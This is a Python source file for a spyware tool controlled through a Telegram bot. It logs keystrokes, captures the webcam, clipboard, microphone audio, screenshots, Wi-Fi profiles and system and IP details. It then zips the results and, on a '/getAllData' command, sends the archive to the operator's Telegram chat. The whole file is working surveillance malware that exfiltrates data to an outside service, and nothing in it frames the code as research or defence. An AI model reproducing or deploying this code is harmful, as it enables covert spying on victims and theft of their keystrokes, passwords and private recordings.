import os
from pynput.keyboard import Listener
import time
import cv2
import win32clipboard
import subprocess
import psutil
import socket
import platform
from requests import get
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import pyautogui
import zipfile
import telebot
import json


def keylogger():
    def log_keystroke(key):
        key= str(key).replace("'","")
        if key == 'Key.space':
            key = ' '
        if key == 'Key.shift_r':
            key = ''
        if key == 'Key.enter':
            key = ' '
        with open("data/keylog.txt",'a') as f:
            f.write(key)
    def on_release(key):
        if( start_time+20 < time.time()):
            return False
    with Listener(on_press=log_keystroke,on_release = on_release) as l:
        start_time = time.time()
        print(start_time)
        l.join()
def capture():
    cam = cv2.VideoCapture(0)
    cv2.namedWindow("test")
    img_counter=0
    start_time = time.time()
    while True :
        ret,frame = cam.read()
        if not ret :
            print("failed to grab frame")
            break
            # cv2.imshow("test",frame)
        k=cv2.waitKey(1)
        if(img_counter == 1):
            break
        elif(time.time() -start_time >3):
            cv2.imwrite('data/captured.jpg',frame)
            img_counter +=1
    cam.release()
    cv2.destroyAllWindows()

def clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    with open('data/clipboard.txt', 'a') as f:
        f.write(data)
def network_info():
    wifi = subprocess.check_output(['netsh','WLAN','show','interfaces'])
    data = wifi.decode('utf-8')
    f = open('data/wifi.txt',"w")
    f.write(data)
    f.close()
    allwifi = subprocess.check_output(['netsh','WLAN','show','profile'])
    alldata = allwifi.decode('utf-8')
    f = open('data/Allwifi.txt',"w")
    f.write(alldata)
    f.close()
def system_info():
    f = open ("data/system_info.txt", "a")
    hostname = socket.gethostname()
    ipadd =socket.gethostbyname(hostname)
    try :
        public_ip = get("https://api.ipify.org/").text
        f.write("public ip address is "+ public_ip + "\n")
    except Exception:
        f.write("Couldn't get public ip address(Internet problem)")
    f.write("Processor: " + platform.processor()+ "\n")
    f.write("System: " + platform.system() + "\n")
    f.write("Machine: " + platform.machine()+ "\n")
    f.write("Hostname "+ hostname + "\n")
    f.write("Private Ip : " + ipadd + "\n")
    f.close()

def networkUsage():
    start_time = 0
    def usage(start_time):
        old_value = 0
        while True:
            new_value = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
            if old_value:
                send_stat(new_value - old_value)
            old_value = new_value
            if( start_time+20 < time.time()):
                return False
            else:
                time.sleep(1)
    def convert_to_gbit(value):
        return value/1024./1024./1024.*8
    def send_stat(value):
        print ("%0.3f" % convert_to_gbit(value))
        with open('data/networkUsage.txt', 'a') as f:
            f.write("%0.3f" % convert_to_gbit(value))
    start_time = time.time()

    usage(start_time)

def sound():
    freq = 44100
    duration = 5
    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
    sd.wait()
    write("data/recording0.wav", freq, recording)
    wv.write("data/recording1.wav", recording, freq, sampwidth=2)

def screenshot():
    time.sleep(0.5)
    screenshot = pyautogui.screenshot()
    screenshot.save("data/screenshot1.png")

def clearing():
    dir = 'data/'
    for f in os.listdir(dir):
        os.remove(os.path.join(dir, f))
    dir = 'dataZipped/'
    for f in os.listdir(dir):
        os.remove(os.path.join(dir, f))
def compress():
    zf = zipfile.ZipFile("dataZipped/myzipfile.zip", "w")
    for dirname, subdirs, files in os.walk("data"):
        zf.write(dirname)
    for filename in files:
        zf.write(os.path.join(dirname, filename))
    zf.close()
    print('Done')


def main():
    clearing()
    keylogger()
    capture()
    clipboard()
    network_info()
    system_info()
    networkUsage()
    sound()
    screenshot()
    compress()

f = open('key.json')
data = json.load(f)
API_KEY =data['key']
bot = telebot.TeleBot(API_KEY)
@bot.message_handler(commands=['hello'])
def hello(message):
    bot.send_message(message.chat.id,"Hey the server is Up")
@bot.message_handler(commands=['getAllData'])
def send_welcome(message):
    bot.send_message(message.chat.id,"Hey pls wait while we are collecting data this may take up to 3 minutes")
    main()
    with open("dataZipped/myzipfile.zip","rb") as misc:
        f=misc.read()
    bot.send_document(message.chat.id,f)
bot.polling()